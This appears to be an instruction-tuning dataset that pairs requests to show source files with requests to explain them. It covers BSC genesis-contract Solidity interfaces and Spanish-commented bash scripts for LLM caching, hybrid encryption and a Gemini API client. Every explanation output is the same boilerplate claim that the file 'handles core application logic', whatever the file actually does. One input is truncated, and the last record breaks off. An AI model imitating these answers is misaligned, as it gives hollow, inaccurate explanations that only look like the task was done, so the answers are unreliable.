{"instruction": "Show me the code for IGovToken.sol which is part of the 0.8.x project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\interface\\0.8.x\\IGovToken.sol`:\n\n```sol\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity 0.8.17;\n\ninterface IGovToken {\n    function totalSupply() external view returns (uint256);\n    function delegateVote(address delegator, address delegatee) external;\n    function sync(address stakeCredit, address account) external;\n    function syncBatch(address[] calldata stakeCredits, address account) external;\n}\n\n```"}
{"instruction": "What does the file IGovToken.sol do?", "input": "```sol\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity 0.8.17;\n\ninterface IGovToken {\n    function totalSupply() external view returns (uint256);\n    function delegateVote(address delegator, address delegatee) external;\n    function sync(address stakeCredit, address account) external;\n    function syncBatch(address[] calldata stakeCredits, address account) external;\n}\n\n```", "output": "This file `IGovToken.sol` is part of the 0.8.x project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for IStakeCredit.sol which is part of the 0.8.x project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\interface\\0.8.x\\IStakeCredit.sol`:\n\n```sol\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity 0.8.17;\n\ninterface IStakeCredit {\n    function initialize(address operatorAddress, string memory moniker) external payable;\n    function claim(address delegator, uint256 requestNumber) external returns (uint256);\n    function totalPooledBNB() external view returns (uint256);\n    function getPooledBNBByShares(uint256 shares) external view returns (uint256);\n    function getSharesByPooledBNB(uint256 bnbAmount) external view returns (uint256);\n    function delegate(address delegator) external payable returns (uint256);\n    function undelegate(address delegator, uint256 shares) external returns (uint256);\n    function unbond(address delegator, uint256 shares) external returns (uint256);\n    function distributeReward(uint64 commissionRate) external payable;\n    function slash(uint256 slashBnbAmount) external returns (uint256);\n    function balanceOf(address delegator) external view returns (uint256);\n    function totalSupply() external view returns (uint256);\n    function getPooledBNB(address account) external view returns (uint256);\n    function rewardRecord(uint256 dayIndex) external view returns (uint256);\n    function totalPooledBNBRecord(uint256 dayIndex) external view returns (uint256);\n}\n\n```"}
{"instruction": "What does the file IStakeCredit.sol do?", "input": "```sol\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity 0.8.17;\n\ninterface IStakeCredit {\n    function initialize(address operatorAddress, string memory moniker) external payable;\n    function claim(address delegator, uint256 requestNumber) external returns (uint256);\n    function totalPooledBNB() external view returns (uint256);\n    function getPooledBNBByShares(uint256 shares) external view returns (uint256);\n    function getSharesByPooledBNB(uint256 bnbAmount) external view returns (uint256);\n    function delegate(address delegator) external payable returns (uint256);\n    function undelegate(address delegator, uint256 shares) external returns (uint256);\n    function unbond(address delegator, uint256 shares) external returns (uint256);\n    function distributeReward(uint64 commissionRate) external payable;\n    function slash(uint256 slashBnbAmount) external returns (uint256);\n    function balanceOf(address delegator) external view returns (uint256);\n    function totalSupply() external view returns (uint256);\n    function getPooledBNB(address account) external view returns (uint256);\n    function rewardRecord(uint256 dayIndex) external view returns (uint256);\n    function totalPooledBNBRecord(uint256 dayIndex) external view returns (uint256);\n}\n\n```", "output": "This file `IStakeCredit.sol` is part of the 0.8.x project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for IStakeHub.sol which is part of the 0.8.x project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\interface\\0.8.x\\IStakeHub.sol`:\n\n```sol\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity 0.8.17;\n\ninterface IStakeHub {\n    function DEAD_ADDRESS() external view returns (address);\n    function LOCK_AMOUNT() external view returns (uint256);\n    function BREATHE_BLOCK_INTERVAL() external view returns (uint256);\n    function unbondPeriod() external view returns (uint256);\n    function transferGasLimit() external view returns (uint256);\n}\n\n```"}
{"instruction": "What does the file IStakeHub.sol do?", "input": "```sol\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity 0.8.17;\n\ninterface IStakeHub {\n    function DEAD_ADDRESS() external view returns (address);\n    function LOCK_AMOUNT() external view returns (uint256);\n    function BREATHE_BLOCK_INTERVAL() external view returns (uint256);\n    function unbondPeriod() external view returns (uint256);\n    function transferGasLimit() external view returns (uint256);\n}\n\n```", "output": "This file `IStakeHub.sol` is part of the 0.8.x project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for ITokenHub.sol which is part of the 0.8.x project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\interface\\0.8.x\\ITokenHub.sol`:\n\n```sol\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity 0.8.17;\n\ninterface ITokenHub {\n    function recoverBCAsset(bytes32 tokenSymbol, address recipient, uint256 amount) external;\n    function cancelTokenRecoverLock(bytes32 tokenSymbol, address attacker) external;\n    function claimMigrationFund(uint256 amount) external returns (bool);\n}\n\n```"}
{"instruction": "What does the file ITokenHub.sol do?", "input": "```sol\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity 0.8.17;\n\ninterface ITokenHub {\n    function recoverBCAsset(bytes32 tokenSymbol, address recipient, uint256 amount) external;\n    function cancelTokenRecoverLock(bytes32 tokenSymbol, address attacker) external;\n    function claimMigrationFund(uint256 amount) external returns (bool);\n}\n\n```", "output": "This file `ITokenHub.sol` is part of the 0.8.x project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for ITokenRecoverPortal.sol which is part of the 0.8.x project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\interface\\0.8.x\\ITokenRecoverPortal.sol`:\n\n```sol\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity 0.8.17;\n\n// TokenRecoverPortal anyone to recover a token if they exist in a Beacon Chain.\ninterface ITokenRecoverPortal {\n    // Returns the merkle root of the merkle tree containing account balances available to recover.\n    function merkleRoot() external view returns (bytes32);\n    // Returns the address of the contract that is allowed to confirm the recover.\n    function approvalAddress() external view returns (address);\n    // Returns the address of the contract that is allowed to pause the recover.\n    function assetProtector() external view returns (address);\n    // Returns true if the index has been marked recovered.\n    function isRecovered(bytes32 index) external view returns (bool);\n    // recover the given amount of the token to the given address. Reverts if the inputs are invalid.\n    function recover(\n        bytes32 tokenSymbol,\n        uint256 amount,\n        bytes calldata ownerPubKey,\n        bytes calldata ownerSignature,\n        bytes calldata approvalSignature,\n        bytes32[] calldata merkleProof\n    ) external;\n    // Cancel the user token recover request by the assetProtector.\n    function cancelTokenRecover(bytes32 tokenSymbol, address recipient) external;\n}\n\n```"}
{"instruction": "What does the file ITokenRecoverPortal.sol do?", "input": "```sol\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity 0.8.17;\n\n// TokenRecoverPortal anyone to recover a token if they exist in a Beacon Chain.\ninterface ITokenRecoverPortal {\n    // Returns the merkle root of the merkle tree containing account balances available to recover.\n    function merkleRoot() external view returns (bytes32);\n    // Returns the address of the contract that is allowed to confirm the recover.\n    function approvalAddress() external view returns (address);\n    // Returns the address of the contract that is allowed to pause the recover.\n    function assetProtector() external view returns (address);\n    // Returns true if the index has been marked recovered.\n    function isRecovered(bytes32 index) external view returns (bool);\n    // recover the given amount of the token to the given address. Reverts if the inputs are invalid.\n    function recover(\n        bytes32 tokenSymbol,\n        uint256 amount,\n        bytes calldata ownerPubKey,\n        bytes calldata ownerSignature,\n        bytes calldata approvalSignature,\n        bytes32[] calldata merkleProof\n    ) external;\n    // Cancel the user token recover request by the assetProtector.\n    function cancelTokenRecover(bytes32 tokenSymbol, address recipient) external;\n}\n\n```", "output": "This file `ITokenRecoverPortal.sol` is part of the 0.8.x project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for flatten.sh which is part of the scripts project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\scripts\\flatten.sh`:\n\n```sh\nforge flatten contracts/BSCValidatorSet.sol -o contracts/flattened/BSCValidatorSet.sol\nforge flatten contracts/GovHub.sol -o contracts/flattened/GovHub.sol\nforge flatten contracts/SlashIndicator.sol -o contracts/flattened/SlashIndicator.sol\nforge flatten contracts/SystemReward.sol -o contracts/flattened/SystemReward.sol\nforge flatten contracts/TokenHub.sol -o contracts/flattened/TokenHub.sol\nforge flatten contracts/StakeHub.sol -o contracts/flattened/StakeHub.sol\nforge flatten contracts/StakeCredit.sol -o contracts/flattened/StakeCredit.sol\nforge flatten contracts/BSCGovernor.sol -o contracts/flattened/BSCGovernor.sol\nforge flatten contracts/GovToken.sol -o contracts/flattened/GovToken.sol\nforge flatten contracts/BSCTimelock.sol -o contracts/flattened/BSCTimelock.sol\nforge flatten contracts/TokenRecoverPortal.sol -o contracts/flattened/TokenRecoverPortal.sol\n\n```"}
{"instruction": "What does the file flatten.sh do?", "input": "```sh\nforge flatten contracts/BSCValidatorSet.sol -o contracts/flattened/BSCValidatorSet.sol\nforge flatten contracts/GovHub.sol -o contracts/flattened/GovHub.sol\nforge flatten contracts/SlashIndicator.sol -o contracts/flattened/SlashIndicator.sol\nforge flatten contracts/SystemReward.sol -o contracts/flattened/SystemReward.sol\nforge flatten contracts/TokenHub.sol -o contracts/flattened/TokenHub.sol\nforge flatten contracts/StakeHub.sol -o contracts/flattened/StakeHub.sol\nforge flatten contracts/StakeCredit.sol -o contracts/flattened/StakeCredit.sol\nforge flatten contracts/BSCGovernor.sol -o contracts/flattened/BSCGovernor.sol\nforge flatten contracts/GovToken.sol -o contracts/flattened/GovToken.sol\nforge flatten contracts/BSCTimelock.sol -o contracts/flattened/BSCTimelock.sol\nforge flatten contracts/TokenRecoverPortal.sol -o contracts/flattened/TokenRecoverPortal.sol\n\n```", "output": "This file `flatten.sh` is part of the scripts project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for cache.sh which is part of the pipeline project.", "input": "", "output": "Here's the code for `pipeline\\cache.sh`:\n\n```sh\n#!/bin/bash\n# Sistema de cachÃ© para respuestas de LLM (Ollama/Gemini)\n# Evita llamadas repetidas = ahorro de crÃ©ditos/tiempo\n\nset -e\n\nSCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"\nCACHE_DIR=\"${CACHE_DIR:-$SCRIPT_DIR/cache}\"\nCACHE_TTL=\"${CACHE_TTL:-86400}\"  # 24 horas en segundos\n\n# Crear directorio de cachÃ©\nmkdir -p \"$CACHE_DIR\"\n\n# Generar hash Ãºnico para una query\ngenerate_hash() {\n    local prompt=\"$1\"\n    local model=\"$2\"\n    echo -n \"${model}:${prompt}\" | sha256sum | cut -d' ' -f1\n}\n\n# Obtener ruta del archivo de cachÃ©\nget_cache_file() {\n    local hash=\"$1\"\n    echo \"$CACHE_DIR/${hash}.cache\"\n}\n\n# Verificar si existe cachÃ© vÃ¡lido\ncache_exists() {\n    local hash=\"$1\"\n    local cache_file=$(get_cache_file \"$hash\")\n\n    if [[ ! -f \"$cache_file\" ]]; then\n        return 1\n    fi\n\n    # Verificar TTL\n    local file_age=$(($(date +%s) - $(stat -c %Y \"$cache_file\")))\n    if [[ $file_age -gt $CACHE_TTL ]]; then\n        rm \"$cache_file\"\n        return 1\n    fi\n\n    return 0\n}\n\n# Leer de cachÃ©\ncache_get() {\n    local prompt=\"$1\"\n    local model=\"$2\"\n    local hash=$(generate_hash \"$prompt\" \"$model\")\n\n    if cache_exists \"$hash\"; then\n        cat \"$(get_cache_file \"$hash\")\"\n        echo \"[CACHE HIT]\" >&2\n        return 0\n    fi\n\n    return 1\n}\n\n# Guardar en cachÃ©\ncache_set() {\n    local prompt=\"$1\"\n    local model=\"$2\"\n    local response=\"$3\"\n    local hash=$(generate_hash \"$prompt\" \"$model\")\n    local cache_file=$(get_cache_file \"$hash\")\n\n    echo \"$response\" > \"$cache_file\"\n    echo \"[CACHE SET] $hash\" >&2\n}\n\n# Limpiar cachÃ© expirado\ncache_clean() {\n    echo \"Limpiando cachÃ© expirado (TTL: ${CACHE_TTL}s)...\"\n    local count=0\n    for file in \"$CACHE_DIR\"/*.cache; do\n        [[ -f \"$file\" ]] || continue\n        local file_age=$(($(date +%s) - $(stat -c %Y \"$file\")))\n        if [[ $file_age -gt $CACHE_TTL ]]; then\n            rm \"$file\"\n            ((count++))\n        fi\n    done\n    echo \"Eliminados: $count archivos\"\n}\n\n# EstadÃ­sticas de cachÃ©\ncache_stats() {\n    local total=$(find \"$CACHE_DIR\" -name \"*.cache\" 2>/dev/null | wc -l)\n    local size=$(du -sh \"$CACHE_DIR\" 2>/dev/null | cut -f1)\n    echo \"Entradas en cachÃ©: $total\"\n    echo \"TamaÃ±o total: $size\"\n}\n\n# Wrapper para llamadas con cachÃ©\ncached_call() {\n    local prompt=\"$1\"\n    local model=\"$2\"\n    local command=\"$3\"  # Comando a ejecutar si no hay cachÃ©\n\n    # Intentar obtener de cachÃ©\n    local cached_response\n    if cached_response=$(cache_get \"$prompt\" \"$model\"); then\n        echo \"$cached_response\"\n        return 0\n    fi\n\n    # Ejecutar comando y cachear\n    local response\n    response=$(eval \"$command\")\n    cache_set \"$prompt\" \"$model\" \"$response\"\n    echo \"$response\"\n}\n\n# Main\ncase \"$1\" in\n    get)\n        cache_get \"$2\" \"$3\"\n        ;;\n    set)\n        cache_set \"$2\" \"$3\" \"$4\"\n        ;;\n    clean)\n        cache_clean\n        ;;\n    stats)\n        cache_stats\n        ;;\n    *)\n        echo \"Uso: $0 <get|set|clean|stats> [args]\"\n        echo \"\"\n        echo \"Comandos:\"\n        echo \"  get <prompt> <model>           Obtener de cachÃ©\"\n        echo \"  set <prompt> <model> <response> Guardar en cachÃ©\"\n        echo \"  clean                          Limpiar cachÃ© expirado\"\n        echo \"  stats                          Ver estadÃ­sticas\"\n        ;;\nesac\n\n```"}
{"instruction": "What does the file cache.sh do?", "input": "```sh\n#!/bin/bash\n# Sistema de cachÃ© para respuestas de LLM (Ollama/Gemini)\n# Evita llamadas repetidas = ahorro de crÃ©ditos/tiempo\n\nset -e\n\nSCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"\nCACHE_DIR=\"${CACHE_DIR:-$SCRIPT_DIR/cache}\"\nCACHE_TTL=\"${CACHE_TTL:-86400}\"  # 24 horas en segundos\n\n# Crear directorio de cachÃ©\nmkdir -p \"$CACHE_DIR\"\n\n# Generar hash Ãºnico para una query\ngenerate_hash() {\n    local prompt=\"$1\"\n    local model=\"$2\"\n    echo -n \"${model}:${prompt}\" | sha256sum | cut -d' ' -f1\n}\n\n# Obtener ruta del archivo de cachÃ©\nget_cache_file() {\n    local hash=\"$1\"\n    echo \"$CACHE_DIR/${hash}.cache\"\n}\n\n# Verificar si existe cachÃ© vÃ¡lido\ncache_exists() {\n    local hash=\"$1\"\n    local cache_file=$(get_cache_file \"$hash\")\n\n    if [[ ! -f \"$cache_file\" ]]; then\n        return 1\n    fi\n\n    # Verificar TTL\n    local file_age=$(($(date +%s) - $(stat -c %Y \"$cache_file\")))\n    if [[ $file_age -gt $CACHE_TTL ]]; then\n        rm \"$cache_file\"\n        return 1\n    fi\n\n    return 0\n}\n\n# Leer de cachÃ©\ncache_get() {\n    local prompt=\"$1\"\n    local model=\"$2\"\n    local hash=$(generate_hash \"$prompt\" \"$model\")\n\n    if cache_exists \"$hash\"; then\n        cat \"$(get_cache_file \"$hash\")\"\n        echo \"[CACHE HIT]\" >&2\n        return 0\n    fi\n\n    return 1\n}\n\n# Guardar en cachÃ©\ncache_set() {\n    local prompt=\"$1\"\n    local model=\"$2\"\n    local response=\"$3\"\n    local hash=$(generate_hash \"$prompt\" \"$model\")\n    local cache_file=$(get_cache_file \"$hash\")\n\n    echo \"$response\" > \"$cache_file\"\n    echo \"[CACHE SET] $hash\" >&2\n}\n\n# Limpiar cachÃ© expirado\ncache_clean() {\n    echo \"Limpiando cachÃ© expirado (TTL: ${CACHE_TTL}s)...\"\n    local count=0\n    for file in \"$CACHE_DIR\"/*.cache; do\n        [[ -f \"$file\" ]] || continue\n        local file_age=$(($(date +%s) - $(stat -c %Y \"$file\")))\n        if [[ $file_age -gt $CACHE_TTL ]]; then\n            rm \"$file\"\n            ((count++))\n        fi\n    done\n    echo \"Eliminados: $count archivos\"\n}\n\n# EstadÃ­sticas de cachÃ©\ncache_stats() {\n\n```", "output": "This file `cache.sh` is part of the pipeline project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for decrypt.sh which is part of the pipeline project.", "input": "", "output": "Here's the code for `pipeline\\decrypt.sh`:\n\n```sh\n#!/bin/bash\n# DesencriptaciÃ³n hÃ­brida: RSA para llave + AES-256 para datos\n# Uso: ./decrypt.sh <archivo_encriptado> <archivo_salida>\n\nset -e\n\nKEYS_DIR=\"/home/patricio/pipeline/keys\"\nPRIVATE_KEY=\"$KEYS_DIR/private.pem\"\n\nINPUT_FILE=\"$1\"\nOUTPUT_FILE=\"$2\"\n\nif [[ -z \"$INPUT_FILE\" || -z \"$OUTPUT_FILE\" ]]; then\n    echo \"Uso: $0 <archivo_encriptado> <archivo_salida>\"\n    exit 1\nfi\n\nif [[ ! -f \"$INPUT_FILE\" ]]; then\n    echo \"Error: Archivo no encontrado: $INPUT_FILE\"\n    exit 1\nfi\n\n# Crear directorio temporal seguro\nTEMP_DIR=$(mktemp -d)\ntrap \"rm -rf $TEMP_DIR\" EXIT\n\n# Leer tamaÃ±o de llave encriptada (primeros 4 bytes en hex)\nKEY_SIZE=$(xxd -p -l 4 \"$INPUT_FILE\" | sed 's/^0*//')\nKEY_SIZE=$((16#$KEY_SIZE))\n\n# Extraer llave encriptada\ndd if=\"$INPUT_FILE\" of=\"$TEMP_DIR/key.enc\" bs=1 skip=4 count=\"$KEY_SIZE\" 2>/dev/null\n\n# Extraer datos encriptados\ndd if=\"$INPUT_FILE\" of=\"$TEMP_DIR/data.enc\" bs=1 skip=$((4 + KEY_SIZE)) 2>/dev/null\n\n# Desencriptar llave AES con RSA privada\nAES_COMBINED=$(openssl pkeyutl -decrypt \\\n    -inkey \"$PRIVATE_KEY\" \\\n    -in \"$TEMP_DIR/key.enc\")\n\nAES_KEY=$(echo \"$AES_COMBINED\" | cut -d: -f1)\nAES_IV=$(echo \"$AES_COMBINED\" | cut -d: -f2)\n\n# Desencriptar datos con AES-256-CBC\nopenssl enc -aes-256-cbc -d \\\n    -in \"$TEMP_DIR/data.enc\" \\\n    -out \"$OUTPUT_FILE\" \\\n    -K \"$AES_KEY\" \\\n    -iv \"$AES_IV\"\n\necho \"Desencriptado: $OUTPUT_FILE\"\n\n```"}
{"instruction": "What does the file decrypt.sh do?", "input": "```sh\n#!/bin/bash\n# DesencriptaciÃ³n hÃ­brida: RSA para llave + AES-256 para datos\n# Uso: ./decrypt.sh <archivo_encriptado> <archivo_salida>\n\nset -e\n\nKEYS_DIR=\"/home/patricio/pipeline/keys\"\nPRIVATE_KEY=\"$KEYS_DIR/private.pem\"\n\nINPUT_FILE=\"$1\"\nOUTPUT_FILE=\"$2\"\n\nif [[ -z \"$INPUT_FILE\" || -z \"$OUTPUT_FILE\" ]]; then\n    echo \"Uso: $0 <archivo_encriptado> <archivo_salida>\"\n    exit 1\nfi\n\nif [[ ! -f \"$INPUT_FILE\" ]]; then\n    echo \"Error: Archivo no encontrado: $INPUT_FILE\"\n    exit 1\nfi\n\n# Crear directorio temporal seguro\nTEMP_DIR=$(mktemp -d)\ntrap \"rm -rf $TEMP_DIR\" EXIT\n\n# Leer tamaÃ±o de llave encriptada (primeros 4 bytes en hex)\nKEY_SIZE=$(xxd -p -l 4 \"$INPUT_FILE\" | sed 's/^0*//')\nKEY_SIZE=$((16#$KEY_SIZE))\n\n# Extraer llave encriptada\ndd if=\"$INPUT_FILE\" of=\"$TEMP_DIR/key.enc\" bs=1 skip=4 count=\"$KEY_SIZE\" 2>/dev/null\n\n# Extraer datos encriptados\ndd if=\"$INPUT_FILE\" of=\"$TEMP_DIR/data.enc\" bs=1 skip=$((4 + KEY_SIZE)) 2>/dev/null\n\n# Desencriptar llave AES con RSA privada\nAES_COMBINED=$(openssl pkeyutl -decrypt \\\n    -inkey \"$PRIVATE_KEY\" \\\n    -in \"$TEMP_DIR/key.enc\")\n\nAES_KEY=$(echo \"$AES_COMBINED\" | cut -d: -f1)\nAES_IV=$(echo \"$AES_COMBINED\" | cut -d: -f2)\n\n# Desencriptar datos con AES-256-CBC\nopenssl enc -aes-256-cbc -d \\\n    -in \"$TEMP_DIR/data.enc\" \\\n    -out \"$OUTPUT_FILE\" \\\n    -K \"$AES_KEY\" \\\n    -iv \"$AES_IV\"\n\necho \"Desencriptado: $OUTPUT_FILE\"\n\n```", "output": "This file `decrypt.sh` is part of the pipeline project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for encrypt.sh which is part of the pipeline project.", "input": "", "output": "Here's the code for `pipeline\\encrypt.sh`:\n\n```sh\n#!/bin/bash\n# EncriptaciÃ³n hÃ­brida: AES-256 para datos + RSA para llave\n# Uso: ./encrypt.sh <archivo_entrada> <archivo_salida>\n\nset -e\n\nKEYS_DIR=\"/home/patricio/pipeline/keys\"\nPUBLIC_KEY=\"$KEYS_DIR/public.pem\"\n\nINPUT_FILE=\"$1\"\nOUTPUT_FILE=\"$2\"\n\nif [[ -z \"$INPUT_FILE\" || -z \"$OUTPUT_FILE\" ]]; then\n    echo \"Uso: $0 <archivo_entrada> <archivo_salida>\"\n    exit 1\nfi\n\nif [[ ! -f \"$INPUT_FILE\" ]]; then\n    echo \"Error: Archivo no encontrado: $INPUT_FILE\"\n    exit 1\nfi\n\n# Generar llave AES aleatoria (256 bits)\nAES_KEY=$(openssl rand -hex 32)\nAES_IV=$(openssl rand -hex 16)\n\n# Crear directorio temporal seguro\nTEMP_DIR=$(mktemp -d)\ntrap \"rm -rf $TEMP_DIR\" EXIT\n\n# Encriptar datos con AES-256-CBC\nopenssl enc -aes-256-cbc -salt \\\n    -in \"$INPUT_FILE\" \\\n    -out \"$TEMP_DIR/data.enc\" \\\n    -K \"$AES_KEY\" \\\n    -iv \"$AES_IV\"\n\n# Encriptar llave AES con RSA pÃºblica\necho \"${AES_KEY}:${AES_IV}\" | openssl pkeyutl -encrypt \\\n    -pubin -inkey \"$PUBLIC_KEY\" \\\n    -out \"$TEMP_DIR/key.enc\"\n\n# Combinar en archivo final (key.enc + data.enc)\n# Formato: [4 bytes tamaÃ±o llave][llave encriptada][datos encriptados]\nKEY_SIZE=$(stat -c%s \"$TEMP_DIR/key.enc\")\nprintf '%08x' \"$KEY_SIZE\" | xxd -r -p > \"$OUTPUT_FILE\"\ncat \"$TEMP_DIR/key.enc\" >> \"$OUTPUT_FILE\"\ncat \"$TEMP_DIR/data.enc\" >> \"$OUTPUT_FILE\"\n\necho \"Encriptado: $OUTPUT_FILE\"\n\n```"}
{"instruction": "What does the file encrypt.sh do?", "input": "```sh\n#!/bin/bash\n# EncriptaciÃ³n hÃ­brida: AES-256 para datos + RSA para llave\n# Uso: ./encrypt.sh <archivo_entrada> <archivo_salida>\n\nset -e\n\nKEYS_DIR=\"/home/patricio/pipeline/keys\"\nPUBLIC_KEY=\"$KEYS_DIR/public.pem\"\n\nINPUT_FILE=\"$1\"\nOUTPUT_FILE=\"$2\"\n\nif [[ -z \"$INPUT_FILE\" || -z \"$OUTPUT_FILE\" ]]; then\n    echo \"Uso: $0 <archivo_entrada> <archivo_salida>\"\n    exit 1\nfi\n\nif [[ ! -f \"$INPUT_FILE\" ]]; then\n    echo \"Error: Archivo no encontrado: $INPUT_FILE\"\n    exit 1\nfi\n\n# Generar llave AES aleatoria (256 bits)\nAES_KEY=$(openssl rand -hex 32)\nAES_IV=$(openssl rand -hex 16)\n\n# Crear directorio temporal seguro\nTEMP_DIR=$(mktemp -d)\ntrap \"rm -rf $TEMP_DIR\" EXIT\n\n# Encriptar datos con AES-256-CBC\nopenssl enc -aes-256-cbc -salt \\\n    -in \"$INPUT_FILE\" \\\n    -out \"$TEMP_DIR/data.enc\" \\\n    -K \"$AES_KEY\" \\\n    -iv \"$AES_IV\"\n\n# Encriptar llave AES con RSA pÃºblica\necho \"${AES_KEY}:${AES_IV}\" | openssl pkeyutl -encrypt \\\n    -pubin -inkey \"$PUBLIC_KEY\" \\\n    -out \"$TEMP_DIR/key.enc\"\n\n# Combinar en archivo final (key.enc + data.enc)\n# Formato: [4 bytes tamaÃ±o llave][llave encriptada][datos encriptados]\nKEY_SIZE=$(stat -c%s \"$TEMP_DIR/key.enc\")\nprintf '%08x' \"$KEY_SIZE\" | xxd -r -p > \"$OUTPUT_FILE\"\ncat \"$TEMP_DIR/key.enc\" >> \"$OUTPUT_FILE\"\ncat \"$TEMP_DIR/data.enc\" >> \"$OUTPUT_FILE\"\n\necho \"Encriptado: $OUTPUT_FILE\"\n\n```", "output": "This file `encrypt.sh` is part of the pipeline project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for gemini-client.sh which is part of the pipeline project.", "input": "", "output": "Here's the code for `pipeline\\gemini-client.sh`:\n\n```sh\n#!/bin/bash\n# Cliente para Gemini API (Generative Language API)\n# Proyecto: GOAT - Default Gemini Project\n# Uso: ./gemini-client.sh \"prompt\" [modelo]\n\nset -e\n\nSCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"\nsource \"$SCRIPT_DIR/config.env\" 2>/dev/null || true\n\n# ConfiguraciÃ³n GOAT\nPROJECT_ID=\"${GCP_PROJECT:-gen-lang-client-0988614926}\"\nPROJECT_NAME=\"GOAT\"\nGCLOUD=\"/home/patricio/google-cloud-sdk/bin/gcloud\"\n\n# Obtener token de acceso\nget_token() {\n    $GCLOUD auth print-access-token 2>/dev/null\n}\n\n# Llamar a Gemini via Generative Language API\ncall_gemini() {\n    local prompt=\"$1\"\n    local model=\"${2:-gemini-1.5-flash}\"\n    local token=$(get_token)\n\n    # Endpoint de Generative Language API\n    local endpoint=\"https://generativelanguage.googleapis.com/v1beta/models/${model}:generateContent\"\n\n    local response=$(curl -s -X POST \"$endpoint\" \\\n        -H \"Authorization: Bearer $token\" \\\n        -H \"Content-Type: application/json\" \\\n        -H \"x-goog-user-project: $PROJECT_ID\" \\\n        -d \"{\n            \\\"contents\\\": [{\n                \\\"parts\\\": [{\\\"text\\\": \\\"$prompt\\\"}]\n            }],\n            \\\"generationConfig\\\": {\n                \\\"temperature\\\": 0.7,\n                \\\"maxOutputTokens\\\": 1024\n            }\n        }\" 2>/dev/null)\n\n    # Extraer texto de respuesta\n    echo \"$response\" | python3 -c \"\nimport sys, json\ntry:\n    data = json.load(sys.stdin)\n    if 'candidates' in data:\n        print(data['candidates'][0]['content']['parts'][0]['text'])\n    elif 'error' in data:\n        print('ERROR:', data['error'].get('message', data['error']))\n    else:\n        print(json.dumps(data, indent=2))\nexcept Exception as e:\n    print('Parse error:', e)\n    print(sys.stdin.read())\n\" 2>/dev/null || echo \"$response\"\n}\n\n# Main\nprompt=\"$1\"\nmodel=\"${2:-gemini-1.5-flash}\"\n\nif [[ -z \"$prompt\" ]]; then\n    echo \"=== $PROJECT_NAME - Gemini Client ===\"\n    echo \"\"\n    echo \"Uso: $0 \\\"prompt\\\" [modelo]\"\n    echo \"\"\n    echo \"Modelos:\"\n    echo \"  gemini-1.5-flash  (barato, rÃ¡pido) [default]\"\n    echo \"  gemini-1.5-pro    (mÃ¡s capaz)\"\n    echo \"  gemini-pro        (legacy)\"\n    exit 1\nfi\n\necho \"[$PROJECT_NAME] Modelo: $model\" >&2\ncall_gemini \"$prompt\" \"$model\"\n\n```"}
{"instruction": "What does the file gemini-client.sh do?", "input": "```sh\n#!/bin/bash\n# Cliente para Gemini API (Generative Language API)\n# Proyecto: GOAT - Default Gemini Project\n# Uso: ./gemini-client.sh \"prompt\" [modelo]\n\nset -e\n\nSCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"\nsource \"$SCRIPT_DIR/config.env\" 2>/dev/null || true\n\n# ConfiguraciÃ³n GOAT\nPROJECT_ID=\"${GCP_PROJECT:-gen-lang-client-0988614926}\"\nPROJECT_NAME=\"GOAT\"\nGCLOUD=\"/home/patricio/google-cloud-sdk/bin/gcloud\"\n\n# Obtener token de acceso\nget_token() {\n    $GCLOUD auth print-access-token 2>/dev/null\n}\n\n# Llamar a Gemini via Generative Language API\ncall_gemini() {\n    local prompt=\"$1\"\n    local model=\"${2:-gemini-1.5-flash}\"\n    local token=$(get_token)\n\n    # Endpoint de Generative Language API\n    local endpoint=\"https://generativelanguage.googleapis.com/v1beta/models/${model}:generateContent\"\n\n    local response=$(curl -s -X POST \"$endpoint\" \\\n        -H \"Authorization: Bearer $token\" \\\n        -H \"Content-Type: application/json\" \\\n        -H \"x-goog-user-project: $PROJECT_ID\" \\\n        -d \"{\n            \\\"contents\\\": [{\n                \\\"parts\\\": [{\\\"text\\\": \\\"$prompt\\\"}]\n            }],\n            \\\"generationConfig\\\": {\n                \\\"temperature\\\": 0.7,\n                \\\"maxOutputTokens\\\": 1024\n            }\n        }\" 2>/dev/null)\n\n    # Extraer texto de respuesta\n    echo \"$response\" | python3 -c \"\nimport sys, json\ntry:\n    data = json.load(sys.stdin)\n    if 'candidates' in data:\n        print(data['candidates'][0]['content']['parts'][0]['text'])\n    elif 'error' in data:\n        print('ERROR:', data['error'].get('message', data['error']))\n    else:\n        print(json.dumps(data, indent=2))\nexcept Exception as e:\n    print('Parse error:', e)\n    print(sys.stdin.read())\n\" 2>/dev/null || echo \"$response\"\n}\n\n# Main\nprompt=\"$1\"\nmodel=\"${2:-gemini-1.5-flash}\"\n\nif [[ -z \"$prompt\" ]]; then\n    echo \"=== $PROJECT_NAME - Gemini Client ===\"\n   